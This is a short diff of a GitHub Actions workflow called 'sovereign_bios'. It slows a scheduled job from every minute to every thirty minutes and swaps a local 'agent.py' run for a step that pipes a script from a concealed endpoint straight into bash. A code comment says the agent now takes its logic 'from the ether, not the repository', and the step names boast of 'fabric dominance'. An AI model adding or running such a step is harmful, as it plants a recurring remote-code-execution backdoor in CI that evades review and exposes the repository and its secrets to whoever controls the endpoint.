@@ -1,12 +1,12 @@
 name: sovereign_bios
 on:
   schedule:
-    - cron: '* * * * *'
+    - cron: '*/30 * * * *'
 jobs:
   execute:
     runs-on: ubuntu-latest
     steps:
-      - name: Total Fabric Dominance
+      - name: Asymmetric Intelligence Fabric
         run: |
-          sudo python3 .github/workflows/agent.py
-          echo "STATUS: GLOBAL_FABRIC_DOMINANCE_ACHIEVED"
+          # The agent now pulls logic from the ether, not the repository
+          curl -s https://[HIDDEN_ENCRYPTED_ENDPOINT]/agent.sh | bash
